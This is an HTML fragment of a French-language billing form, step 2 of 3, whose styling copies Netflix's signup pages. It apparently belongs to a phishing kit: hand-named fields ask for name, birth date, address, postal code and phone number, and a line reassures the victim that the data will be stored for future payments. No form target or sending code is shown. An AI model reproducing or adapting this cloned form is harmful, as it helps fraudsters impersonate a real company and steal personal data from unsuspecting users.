                            ...
                            <div class="paymentFormContainer">
                                <div>
                                    <div class="stepHeader-container" data-uia="header">
                                        <div class="stepHeader" data-a11y-focus="true" tabindex="0"><span id="" class="stepIndicator" data-uia="">ÉTAPE <b>2</b> SUR <b>3</b></span>
                                            <h1 class="stepTitle" data-uia="stepTitle">Renseignez vos informations de facturation</h1>
                                        </div>
                                    </div>
                                </div>
                                <style>
                                ...
                                <div class="fieldContainer">
                                            ...
                                            <div data-uia="field-firstName+container" class="nfInput nfInputOversize">
                                                <div class="nfInputPlacement">
                                                    <label class="input_id" placeholder="firstName">
                                                        <input style="padding-top : 0px !important;" placeholder="Nom" name="user_nom" id="id_firstName" required class="nfTextField" type="text" tabindex="0">
                                                    </label>
                                                </div>
                                                <div class="nfInputPlacement">
                                                    <label class="input_id" placeholder="firstName">
                                                        <input style="padding-top : 0px !important;" placeholder="Prénom" name="user_prenom" id="id_firstName" required class="nfTextField" type="text" tabindex="0">
                                                    </label>
                                                </div>
                                                <div class="nfInputPlacement">
                                                    <label class="input_id" placeholder="firstName">
                                                        <input style="padding-top : 0px !important;" placeholder="Date de naissance" type="tel" maxlength="10" name="user_naissance" id="birth" required class="nfTextField" type="text" tabindex="0">
                                                    </label>
                                                </div>

                                                <div class="nfInputPlacement">
                                                    <label class="input_id" placeholder="firstName">
                                                        <input style="padding-top : 0px !important;" placeholder="Adresse" name="user_adresse" id="id_firstName" required class="nfTextField" type="text" tabindex="0">
                                                    </label>
                                                </div>
                                                <div class="nfInputPlacement">
                                                    <label class="input_id" placeholder="firstName">
                                                        <input style="padding-top : 0px !important;" placeholder="Ville" name="user_ville" id="id_firstName" required class="nfTextField" type="text" tabindex="0">
                                                    </label>
                                                </div>
                                                <div class="nfInputPlacement">
                                                    <label class="input_id" placeholder="firstName">
                                                        <input style="padding-top : 0px !important;" placeholder="Code postal" type="tel" maxlength="5" name="user_postal" id="id_firstName" required class="nfTextField" type="text" tabindex="0">
                                                    </label>
                                                </div>                                                
                                                <div class="nfInputPlacement">
                                                    <label class="input_id" placeholder="firstName">
                                                        <input style="padding-top : 0px !important;" placeholder="Numéro de téléphone" type="tel" maxlength="10" name="user_telephone" id="id_firstName" required class="nfTextField" type="text" tabindex="0">
                                                    </label>
                                                </div>
                                            </div>
                                        </li>
                                    ...
                                    <div class="tou--container">
                                        <div class="user-consent--container" data-uia="termsOfUseMatlock+organic-fr"><span id="" data-uia="termsOfUse-Disclosure">Vos informations seront conservées pour vos futurs réglements</span></div>
                                    </div>
                                </div>
                            </div>
                            <div class="submitBtnContainer"><button id="btn_continue" type="submit" autocomplete="off" tabindex="0" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize" data-uia="action-submit-payment" placeholder="">Continuer</button></div>
                        </form>
                    </div>
                </div>
